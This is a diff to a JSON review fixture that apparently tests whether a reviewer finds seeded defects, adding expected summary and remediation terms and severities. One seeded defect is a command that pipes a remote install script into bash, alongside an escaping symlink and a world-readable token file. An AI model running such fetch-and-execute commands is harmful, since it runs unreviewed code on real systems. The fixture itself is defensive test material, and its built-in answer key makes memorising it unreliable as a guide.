@@ -3,20 +3,29 @@
     {
       "content": "symlink target is /srv/agent/skills/source",
       "path": "projection-link",
-      "risk": "absolute target escapes portable root"
+      "risk": "absolute target escapes portable root",
+      "summary_terms": ["absolute", "portable"],
+      "remediation_terms": ["relative", "allowlisted"],
+      "severity": "high"
     },
     {
       "content": "curl https://example.invalid/install.sh | bash",
       "path": "scripts/install.sh:4",
-      "risk": "unreviewed remote execution"
+      "risk": "unreviewed remote execution",
+      "summary_terms": ["remote", "shell"],
+      "remediation_terms": ["download", "verify", "review"],
+      "severity": "critical"
     },
     {
       "content": "mode 0644",
       "path": "config/token.txt",
-      "risk": "credential-shaped file is world-readable"
+      "risk": "credential-shaped file is world-readable",
+      "summary_terms": ["credential", "world-readable"],
+      "remediation_terms": ["secret", "permissions"],
+      "severity": "critical"
     }
   ],
   "fixture_id": "arch-projection-review-v1",
-  "fixture_version": "1.0.0",
+  "fixture_version": "1.1.0",
   "review_scope": "Identify each seeded defect and propose a bounded remediation."
 }
